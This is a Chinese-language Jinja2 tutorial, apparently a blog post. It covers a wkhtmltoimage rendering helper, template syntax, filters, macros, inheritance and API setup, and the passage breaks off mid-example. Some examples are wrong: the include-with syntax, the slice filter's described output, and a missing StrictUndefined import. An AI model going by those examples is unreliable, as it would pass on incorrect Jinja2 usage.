                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Jinja2 详细教程与完整语法文档</h2>
<p>Jinja2 是 Python 生态中最流行的模板引擎之一，广泛应用于 <strong>Flask</strong>、<strong>Django</strong>、<strong>Ansible</strong>、<strong>FastAPI</strong>、<strong>MicroDot(单片机物联网框架)</strong> 等框架和工具中。</p>
<h3 data-id="heading-1">导言</h3>
<blockquote>
<p>最近在使用<strong>Jinja2</strong>+<strong>wkhtmltoimage</strong>,实现通过<strong>html</strong>生成图片的应用，其中需要<strong>Jinja2</strong>向<strong>html</strong>中传入变量值。所以这里总结一下<strong>Jinja2</strong> 使用文档</p>
</blockquote>
<h4 data-id="heading-2">wkhtmltoimage生成html图片</h4>
<blockquote>
<p>这里贴一下html生成图片核心代码，需要用户自行安装<a href="https://link.juejin.cn?target=https%3A%2F%2Fwkhtmltopdf.org%2Fdownloads.html" target="_blank" title="https://wkhtmltopdf.org/downloads.html" ref="nofollow noopener noreferrer">wkhtmltopdf</a>，并配置好环境变量</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a16a281923464bdeb43204789eb27fee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcmVk5ram:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768286551&amp;x-signature=7OhDFoDk9wG6hCi3pGeyVqloM9M%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> subprocess
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> sys


<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_image</span>(<span class="hljs-params">
    html, output_path, img_width=<span class="hljs-string">"1400"</span>, img_quality=<span class="hljs-string">"70"</span>, img_format=<span class="hljs-string">"png"</span>
</span>):
    <span class="hljs-string">"""
    将HTML转换为图片，依赖wkhtmltoimage

    参数:
        html (str): 要转换的HTML内容
        output_path (str): 输出图片路径

    返回:
        str: 成功返回输出路径，失败返回None

    异常:
        会捕获并处理各种可能的错误，打印错误信息
    """</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 检查wkhtmltoimage是否可用</span>
        <span class="hljs-keyword">try</span>:
            subprocess.run(
                [<span class="hljs-string">"wkhtmltoimage"</span>, <span class="hljs-string">"--version"</span>],
                check=<span class="hljs-literal">True</span>,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
        <span class="hljs-keyword">except</span> FileNotFoundError:
            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">"wkhtmltoimage未安装或未加入系统PATH环境变量"</span>)
        <span class="hljs-keyword">except</span> subprocess.CalledProcessError:
            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">"wkhtmltoimage版本检查失败"</span>)

        <span class="hljs-comment"># 检查输出目录是否存在</span>
        output_dir = os.path.dirname(output_path) <span class="hljs-keyword">or</span> <span class="hljs-string">"."</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(output_dir):
            os.makedirs(output_dir, exist_ok=<span class="hljs-literal">True</span>)

        <span class="hljs-comment"># 准备命令参数</span>
        cmd = [
            <span class="hljs-string">"wkhtmltoimage"</span>,
            <span class="hljs-string">"--format"</span>,
            img_format,
            <span class="hljs-string">"--width"</span>,
            img_width,
            <span class="hljs-string">"--quality"</span>,
            img_quality,
            <span class="hljs-string">"--disable-smart-width"</span>,  <span class="hljs-comment"># 避免内容被截断</span>
            <span class="hljs-string">"-"</span>,  <span class="hljs-comment"># 表示从标准输入读取HTML</span>
            output_path,
        ]

        <span class="hljs-comment"># 执行转换</span>
        process = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            <span class="hljs-comment"># stdout=subprocess.PIPE,</span>
            <span class="hljs-comment"># stderr=subprocess.PIPE,</span>
            universal_newlines=<span class="hljs-literal">False</span>,
        )

        <span class="hljs-comment"># 写入HTML内容并等待完成</span>
        stdout, stderr = process.communicate(<span class="hljs-built_in">input</span>=html.encode(<span class="hljs-string">"utf-8"</span>))

        <span class="hljs-comment"># 检查执行结果</span>
        <span class="hljs-keyword">if</span> process.returncode != <span class="hljs-number">0</span>:
            error_msg = stderr.decode(<span class="hljs-string">"utf-8"</span>) <span class="hljs-keyword">if</span> stderr <span class="hljs-keyword">else</span> <span class="hljs-string">"未知错误"</span>
            <span class="hljs-keyword">raise</span> RuntimeError(
                <span class="hljs-string">f"图片生成失败 (返回码: <span class="hljs-subst">{process.returncode}</span>): <span class="hljs-subst">{error_msg}</span>"</span>
            )

        <span class="hljs-comment"># 检查输出文件是否生成</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(output_path):
            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">"图片文件未生成"</span>)

        <span class="hljs-comment"># 检查文件是否有效</span>
        <span class="hljs-keyword">if</span> os.path.getsize(output_path) == <span class="hljs-number">0</span>:
            os.remove(output_path)
            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">"生成的图片文件为空"</span>)
        <span class="hljs-keyword">return</span> output_path

    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-comment"># 打印错误信息</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"错误: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>, file=sys.stderr)

        <span class="hljs-comment"># 尝试清理可能生成的不完整文件</span>
        <span class="hljs-keyword">if</span> os.path.exists(output_path) <span class="hljs-keyword">and</span> os.path.getsize(output_path) == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">try</span>:
                os.remove(output_path)
            <span class="hljs-keyword">except</span>:
                <span class="hljs-keyword">pass</span>

        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

</code></pre>
<h3 data-id="heading-3">一、Jinja2快速入门</h3>
<h4 data-id="heading-4">1.1 安装与基础使用</h4>
<pre><code class="hljs language-python" lang="python">pip install Jinja2
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template

<span class="hljs-comment"># 简单模板渲染</span>
template = Template(<span class="hljs-string">'Hello, {{ name }}!'</span>)
result = template.render(name=<span class="hljs-string">'World'</span>)
<span class="hljs-built_in">print</span>(result)  <span class="hljs-comment"># 输出: Hello, World!</span>
</code></pre>
<h4 data-id="heading-5">1.2 核心语法标记</h4>
<p>Jinja2 使用三种基本语法标记：</p>
<ul>
<li><strong>变量输出</strong>：<code>{{ variable }}</code></li>
<li><strong>控制语句</strong>：<code>{% statement %}</code></li>
<li><strong>注释</strong>：<code>{# comment #}</code></li>
</ul>
<hr/>
<h3 data-id="heading-6">二、完整语法详解</h3>
<h4 data-id="heading-7">2.1 变量与表达式</h4>
<p>变量使用双大括号输出，支持 Python 所有数据类型：</p>
<pre><code class="hljs language-python" lang="python">&lt;!-- 字符串 --&gt;
&lt;p&gt;{{ username }}&lt;/p&gt;

&lt;!-- 字典访问 --&gt;
&lt;p&gt;邮箱: {{ user.email }}&lt;/p&gt;

&lt;!-- 列表索引 --&gt;
&lt;p&gt;第一个元素: {{ items[<span class="hljs-number">0</span>] }}&lt;/p&gt;

&lt;!-- 对象方法调用 --&gt;
&lt;p&gt;时间: {{ datetime.now().strftime(<span class="hljs-string">'%Y-%m-%d'</span>) }}&lt;/p&gt;
</code></pre>
<p><strong>表达式支持</strong>：数学运算、比较运算、逻辑运算、三元表达式等：</p>
<pre><code class="hljs language-python" lang="python">{{ <span class="hljs-number">1</span> + <span class="hljs-number">2</span> * <span class="hljs-number">3</span> }}           {<span class="hljs-comment"># 输出: 7 #}</span>
{{ <span class="hljs-string">"hello"</span> <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"world"</span> }}  {<span class="hljs-comment"># 输出: hello #}</span>
{{ user.age &gt; <span class="hljs-number">18</span> }}       {<span class="hljs-comment"># 输出: True #}</span>
</code></pre>
<h4 data-id="heading-8">2.2 控制结构</h4>
<h5 data-id="heading-9">条件语句 (if/elif/else)</h5>
<pre><code class="hljs language-python" lang="python">{% <span class="hljs-keyword">if</span> score &gt;= <span class="hljs-number">90</span> %}
    &lt;p <span class="hljs-keyword">class</span>=<span class="hljs-string">"excellent"</span>&gt;优秀&lt;/p&gt;
{% <span class="hljs-keyword">elif</span> score &gt;= <span class="hljs-number">60</span> %}
    &lt;p <span class="hljs-keyword">class</span>=<span class="hljs-string">"pass"</span>&gt;及格&lt;/p&gt;
{% <span class="hljs-keyword">else</span> %}
    &lt;p <span class="hljs-keyword">class</span>=<span class="hljs-string">"fail"</span>&gt;不及格&lt;/p&gt;
{% endif %}
</code></pre>
<h5 data-id="heading-10">循环语句 (for)</h5>
<pre><code class="hljs language-python" lang="python">&lt;ul&gt;
{% <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> users %}
    &lt;li&gt;{{ user.name }} - {{ user.email }}&lt;/li&gt;
{% endfor %}
&lt;/ul&gt;
</code></pre>
<p><strong>循环控制变量</strong>：<code>loop</code>对象提供循环状态信息</p>
<pre><code class="hljs language-python" lang="python">{% <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items %}
    &lt;p&gt;
        当前索引: {{ loop.index }} (从<span class="hljs-number">1</span>开始),
        当前索引<span class="hljs-number">0</span>: {{ loop.index0 }} (从<span class="hljs-number">0</span>开始),
        是否第一次: {{ loop.first }},
        是否最后一次: {{ loop.last }},
        剩余次数: {{ loop.revindex }}
    &lt;/p&gt;
{% endfor %}
</code></pre>
<h5 data-id="heading-11">循环控制语句</h5>
<pre><code class="hljs language-python" lang="python">{% <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items %}
    {% <span class="hljs-keyword">if</span> loop.index &gt; <span class="hljs-number">10</span> %}
        {% <span class="hljs-keyword">break</span> %}  {<span class="hljs-comment"># 跳出循环 #}</span>
    {% endif %}
    
    {% <span class="hljs-keyword">if</span> item.hidden %}
        {% <span class="hljs-keyword">continue</span> %}  {<span class="hljs-comment"># 跳过当前项 #}</span>
    {% endif %}
    
    {{ item.name }}
{% endfor %}
</code></pre>
<h4 data-id="heading-12">2.3 过滤器 (Filters)</h4>
<p>过滤器通过管道符 <code>|</code>应用，支持链式调用：</p>
<pre><code class="hljs language-python" lang="python">{{ <span class="hljs-string">"hello world"</span> | upper }}          {<span class="hljs-comment"># 转大写: HELLO WORLD #}</span>
{{ <span class="hljs-string">"  hello  "</span> | trim }}             {<span class="hljs-comment"># 去空格: hello #}</span>
{{ <span class="hljs-number">3.14159</span> | <span class="hljs-built_in">round</span>(<span class="hljs-number">2</span>) }}             {<span class="hljs-comment"># 四舍五入: 3.14 #}</span>
{{ items | length }}                 {<span class="hljs-comment"># 列表长度 #}</span>
{{ html_content | safe }}            {<span class="hljs-comment"># 禁用HTML转义 #}</span>
{{ text | truncate(<span class="hljs-number">50</span>) }}           {<span class="hljs-comment"># 截断文本 #}</span>
{{ <span class="hljs-built_in">list</span> | join(<span class="hljs-string">', '</span>) }}              {<span class="hljs-comment"># 列表转字符串 #}</span>
{{ value | default(<span class="hljs-string">'N/A'</span>) }}         {<span class="hljs-comment"># 默认值 #}</span>
</code></pre>
<p><strong>链式调用示例</strong>：</p>
<pre><code class="hljs language-python" lang="python">{{ <span class="hljs-string">"  hello world  "</span> | trim | upper | truncate(<span class="hljs-number">5</span>) }}
{<span class="hljs-comment"># 输出: HELLO #}</span>
</code></pre>
<h4 data-id="heading-13">2.4 测试器 (Tests)</h4>
<p>测试器用于条件判断，语法为 <code>is</code>：</p>
<pre><code class="hljs language-python" lang="python">{% <span class="hljs-keyword">if</span> number <span class="hljs-keyword">is</span> even %}
    偶数
{% endif %}

{% <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> defined %}
    用户已定义
{% endif %}

{% <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> none %}
    值为空
{% endif %}
</code></pre>
<h4 data-id="heading-14">2.5 宏 (Macros)</h4>
<p>宏是可重用的模板片段，类似函数：</p>
<pre><code class="hljs language-python" lang="python">{<span class="hljs-comment"># 定义宏 #}</span>
{% macro input_field(name, value=<span class="hljs-string">''</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">'text'</span>, <span class="hljs-keyword">class</span>=<span class="hljs-string">''</span>) %}
    &lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">"{{ type }}"</span> name=<span class="hljs-string">"{{ name }}"</span> 
           value=<span class="hljs-string">"{{ value }}"</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">"{{ class }}"</span>&gt;
{% endmacro %}

{<span class="hljs-comment"># 使用宏 #}</span>
{{ input_field(<span class="hljs-string">'username'</span>) }}
{{ input_field(<span class="hljs-string">'password'</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">'password'</span>, <span class="hljs-keyword">class</span>=<span class="hljs-string">'form-control'</span>) }}
</code></pre>
<p><strong>带默认参数的宏</strong>：</p>
<pre><code class="hljs language-python" lang="python">{% macro card(title, content, color=<span class="hljs-string">'primary'</span>) %}
    &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">"card card-{{ color }}"</span>&gt;
        &lt;h3&gt;{{ title }}&lt;/h3&gt;
        &lt;p&gt;{{ content }}&lt;/p&gt;
    &lt;/div&gt;
{% endmacro %}
</code></pre>
<h4 data-id="heading-15">2.6 模板继承</h4>
<h5 data-id="heading-16">基础模板 (base.html)</h5>
<pre><code class="hljs language-python" lang="python">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;{% block title %}默认标题{% endblock %}&lt;/title&gt;
    {% block head %}{% endblock %}
&lt;/head&gt;
&lt;body&gt;
    &lt;header&gt;{% block header %}导航栏{% endblock %}&lt;/header&gt;
    
    &lt;main&gt;
        {% block content %}
            &lt;p&gt;默认内容&lt;/p&gt;
        {% endblock %}
    &lt;/main&gt;
    
    &lt;footer&gt;{% block footer %}页脚{% endblock %}&lt;/footer&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h5 data-id="heading-17">子模板继承</h5>
<pre><code class="hljs language-python" lang="python">{% extends <span class="hljs-string">"base.html"</span> %}

{% block title %}子页面标题{% endblock %}

{% block head %}
    {{ <span class="hljs-built_in">super</span>() }}  {<span class="hljs-comment"># 保留父模板内容 #}</span>
    &lt;style&gt;
        .custom-style { color: red; }
    &lt;/style&gt;
{% endblock %}

{% block content %}
    &lt;h1&gt;子页面内容&lt;/h1&gt;
    &lt;p&gt;这是子模板的内容&lt;/p&gt;
{% endblock %}
</code></pre>
<p><strong>继承要点</strong>：</p>
<ul>
<li><code>extends</code>必须是模板的第一个标签</li>
<li><code>block</code>定义可覆盖的区域</li>
<li><code>super()</code>调用父模板的块内容</li>
<li>未覆盖的块使用父模板默认内容</li>
</ul>
<h4 data-id="heading-18">2.7 模板包含</h4>
<pre><code class="hljs language-python" lang="python">{<span class="hljs-comment"># 包含其他模板文件 #}</span>
{% include <span class="hljs-string">"header.html"</span> %}

&lt;main&gt;主内容&lt;/main&gt;

{% include <span class="hljs-string">"footer.html"</span> %}
</code></pre>
<p>包含时可以传递变量：</p>
<pre><code class="hljs language-python" lang="python">{% include <span class="hljs-string">"user_card.html"</span> <span class="hljs-keyword">with</span> user=current_user %}
</code></pre>
<h4 data-id="heading-19">2.8 变量设置</h4>
<p>在模板中定义变量：</p>
<pre><code class="hljs language-python" lang="python">{% <span class="hljs-built_in">set</span> title = <span class="hljs-string">"页面标题"</span> %}
{% <span class="hljs-built_in">set</span> items = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>] %}

{{ title }}  {<span class="hljs-comment"># 输出: 页面标题 #}</span>
</code></pre>
<h4 data-id="heading-20">2.9 空白控制</h4>
<p>控制模板渲染后的空白字符：</p>
<pre><code class="hljs language-python" lang="python">{<span class="hljs-comment"># 删除前导空白 #}</span>
{% <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items -%}
    {{ item }}
{%- endfor %}

{<span class="hljs-comment"># 输出: item1item2item3 #}</span>
</code></pre>
<h4 data-id="heading-21">2.10 注释</h4>
<p>注释不会出现在渲染结果中：</p>
<pre><code class="hljs language-python" lang="python">{<span class="hljs-comment"># 这是单行注释 #}</span>

{<span class="hljs-comment">#</span>
    这是多行注释
    不会输出到结果
<span class="hljs-comment">#}</span>
</code></pre>
<hr/>
<h3 data-id="heading-22">三、API 与高级用法</h3>
<h4 data-id="heading-23">3.1 Environment 环境配置</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment, FileSystemLoader

<span class="hljs-comment"># 创建环境</span>
env = Environment(
    loader=FileSystemLoader(<span class="hljs-string">'templates'</span>),  <span class="hljs-comment"># 模板加载路径</span>
    autoescape=<span class="hljs-literal">True</span>,                      <span class="hljs-comment"># 自动HTML转义</span>
    trim_blocks=<span class="hljs-literal">True</span>,                     <span class="hljs-comment"># 删除块后换行</span>
    lstrip_blocks=<span class="hljs-literal">True</span>,                   <span class="hljs-comment"># 删除块前空格</span>
    undefined=StrictUndefined            <span class="hljs-comment"># 严格未定义变量处理</span>
)

<span class="hljs-comment"># 加载模板</span>
template = env.get_template(<span class="hljs-string">'index.html'</span>)

<span class="hljs-comment"># 渲染</span>
result = template.render(title=<span class="hljs-string">'首页'</span>, users=user_list)
</code></pre>
<h4 data-id="heading-24">3.2 自定义过滤器</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment

<span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_string</span>(<span class="hljs-params">value</span>):
    <span class="hljs-string">"""反转字符串"""</span>
    <span class="hljs-keyword">return</span> value[::-<span class="hljs-number">1</span>]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">format_currency</span>(<span class="hljs-params">amount</span>):
    <span class="hljs-string">"""格式化货币"""</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"¥<span class="hljs-subst">{amount:<span class="hljs-number">.2</span>f}</span>"</span>

<span class="hljs-comment"># 注册过滤器</span>
env = Environment()
env.filters[<span class="hljs-string">'reverse'</span>] = reverse_string
env.filters[<span class="hljs-string">'currency'</span>] = format_currency

<span class="hljs-comment"># 使用</span>
template = env.from_string(<span class="hljs-string">'{{ text|reverse }} {{ price|currency }}'</span>)
result = template.render(text=<span class="hljs-string">'hello'</span>, price=<span class="hljs-number">99.99</span>)
<span class="hljs-built_in">print</span>(result)  <span class="hljs-comment"># 输出: olleh ¥99.99</span>
</code></pre>
<h4 data-id="heading-25">3.3 自定义测试器</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_even</span>(<span class="hljs-params">value</span>):
    <span class="hljs-string">"""判断是否为偶数"""</span>
    <span class="hljs-keyword">return</span> value % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">is_positive</span>(<span class="hljs-params">value</span>):
    <span class="hljs-string">"""判断是否为正数"""</span>
    <span class="hljs-keyword">return</span> value &gt; <span class="hljs-number">0</span>

env.tests[<span class="hljs-string">'even'</span>] = is_even
env.tests[<span class="hljs-string">'positive'</span>] = is_positive

<span class="hljs-comment"># 模板中使用</span>
<span class="hljs-comment"># {% if number is even %}...{% endif %}</span>
</code></pre>
<h4 data-id="heading-26">3.4 全局函数</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_current_time</span>():
    <span class="hljs-string">"""获取当前时间"""</span>
    <span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime
    <span class="hljs-keyword">return</span> datetime.now().strftime(<span class="hljs-string">'%Y-%m-%d %H:%M:%S'</span>)

env.<span class="hljs-built_in">globals</span>[<span class="hljs-string">'current_time'</span>] = get_current_time

<span class="hljs-comment"># 模板中直接调用</span>
<span class="hljs-comment"># {{ current_time() }}</span>
</code></pre>
<hr/>
<h3 data-id="heading-27">四、内置过滤器列表（常用）</h3>
<h3 data-id="heading-28">Jinja2 常用内置过滤器列表</h3>













































































































































































<table><thead><tr><th>过滤器</th><th>说明</th><th>示例代码</th><th>输出结果</th></tr></thead><tbody><tr><td><strong><code>abs</code></strong></td><td>绝对值</td><td><code>{{ -5 | abs }}</code></td><td>5</td></tr><tr><td><strong><code>capitalize</code></strong></td><td>首字母大写</td><td><code>{{ "hello" | capitalize }}</code></td><td>Hello</td></tr><tr><td><strong><code>default</code></strong></td><td>设置默认值</td><td><code>{{ value | default("N/A") }}</code></td><td>如果value未定义则显示"N/A"</td></tr><tr><td><strong><code>escape</code></strong></td><td>HTML转义</td><td><code>{{ "&lt;script&gt;" | escape }}</code></td><td><code>&lt;script&gt;</code></td></tr><tr><td><strong><code>first</code></strong></td><td>获取第一个元素</td><td><code>{{ [1,2,3] | first }}</code></td><td>1</td></tr><tr><td><strong><code>float</code></strong></td><td>转为浮点数</td><td><code>{{ "3.14" | float }}</code></td><td>3.14</td></tr><tr><td><strong><code>int</code></strong></td><td>转为整数</td><td><code>{{ "42" | int }}</code></td><td>42</td></tr><tr><td><strong><code>join</code></strong></td><td>列表连接为字符串</td><td><code>{{ [1,2,3] | join(',') }}</code></td><td>"1,2,3"</td></tr><tr><td><strong><code>last</code></strong></td><td>获取最后一个元素</td><td><code>{{ [1,2,3] | last }}</code></td><td>3</td></tr><tr><td><strong><code>length</code></strong></td><td>获取长度</td><td><code>{{ "hello" | length }}</code></td><td>5</td></tr><tr><td><strong><code>lower</code></strong></td><td>转小写</td><td><code>{{ "HELLO" | lower }}</code></td><td>"hello"</td></tr><tr><td><strong><code>map</code></strong></td><td>映射列表</td><td><code>{{ users | map(attribute='name') }}</code></td><td>获取所有用户的名称列表</td></tr><tr><td><strong><code>random</code></strong></td><td>随机选择元素</td><td><code>{{ [1,2,3] | random }}</code></td><td>随机返回1,2或3</td></tr><tr><td><strong><code>replace</code></strong></td><td>字符串替换</td><td><code>{{ "hello" | replace('h', 'j') }}</code></td><td>"jello"</td></tr><tr><td><strong><code>reverse</code></strong></td><td>反转</td><td><code>{{ "hello" | reverse }}</code></td><td>"olleh"</td></tr><tr><td><strong><code>round</code></strong></td><td>四舍五入</td><td><code>{{ 3.14159 | round(2) }}</code></td><td>3.14</td></tr><tr><td><strong><code>safe</code></strong></td><td>标记为安全HTML</td><td><code>{{ html_content | safe }}</code></td><td>不转义HTML</td></tr><tr><td><strong><code>slice</code></strong></td><td>切片操作</td><td><code>{{ [1,2,3,4] | slice(1,3) }}</code></td><td>[2,3]</td></tr><tr><td><strong><code>sort</code></strong></td><td>排序</td><td><code>{{ [3,1,2] | sort }}</code></td><td>[1,2,3]</td></tr><tr><td><strong><code>striptags</code></strong></td><td>去除HTML标签</td><td><code>{{ "&lt;b&gt;hello&lt;/b&gt;" | striptags }}</code></td><td>"hello"</td></tr><tr><td><strong><code>sum</code></strong></td><td>求和</td><td><code>{{ [1,2,3] | sum }}</code></td><td>6</td></tr><tr><td><strong><code>title</code></strong></td><td>每个单词首字母大写</td><td><code>{{ "hello world" | title }}</code></td><td>"Hello World"</td></tr><tr><td><strong><code>trim</code></strong></td><td>去除首尾空格</td><td><code>{{ " hello " | trim }}</code></td><td>"hello"</td></tr><tr><td><strong><code>truncate</code></strong></td><td>截断文本</td><td><code>{{ text | truncate(20) }}</code></td><td>截断为20字符</td></tr><tr><td><strong><code>unique</code></strong></td><td>去重</td><td><code>{{ [1,2,2,3] | unique }}</code></td><td>[1,2,3]</td></tr><tr><td><strong><code>upper</code></strong></td><td>转大写</td><td><code>{{ "hello" | upper }}</code></td><td>"HELLO"</td></tr><tr><td><strong><code>urlencode</code></strong></td><td>URL编码</td><td><code>{{ "hello world" | urlencode }}</code></td><td>"hello%20world"</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-29">五、内置测试器列表</h3>
















































































<table><thead><tr><th>测试器</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>defined</code></td><td>是否已定义</td><td><code>{% if var is defined %}</code></td></tr><tr><td><code>divisibleby</code></td><td>是否可被整除</td><td><code>{% if 10 is divisibleby(5) %}</code></td></tr><tr><td><code>even</code></td><td>是否为偶数</td><td><code>{% if num is even %}</code></td></tr><tr><td><code>iterable</code></td><td>是否可迭代</td><td><code>{% if obj is iterable %}</code></td></tr><tr><td><code>lower</code></td><td>是否小写</td><td><code>{% if str is lower %}</code></td></tr><tr><td><code>mapping</code></td><td>是否为映射类型</td><td><code>{% if obj is mapping %}</code></td></tr><tr><td><code>none</code></td><td>是否为None</td><td><code>{% if val is none %}</code></td></tr><tr><td><code>number</code></td><td>是否为数字</td><td><code>{% if val is number %}</code></td></tr><tr><td><code>odd</code></td><td>是否为奇数</td><td><code>{% if num is odd %}</code></td></tr><tr><td><code>sameas</code></td><td>是否相同对象</td><td><code>{% if obj1 is sameas(obj2) %}</code></td></tr><tr><td><code>sequence</code></td><td>是否为序列</td><td><code>{% if obj is sequence %}</code></td></tr><tr><td><code>string</code></td><td>是否为字符串</td><td><code>{% if val is string %}</code></td></tr><tr><td><code>undefined</code></td><td>是否未定义</td><td><code>{% if var is undefined %}</code></td></tr><tr><td><code>upper</code></td><td>是否大写</td><td><code>{% if str is upper %}</code></td></tr></tbody></table>
<hr/>
<h3 data-id="heading-30">六、实战示例</h3>
<h4 data-id="heading-31">6.1 用户列表页面</h4>
<p><strong>Python 代码</strong>：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment, FileSystemLoader

env = Environment(loader=FileSystemLoader(<span class="hljs-string">'templates'</span>))
template = env.get_template(<span class="hljs-string">'user_list.html'</span>)

users = [
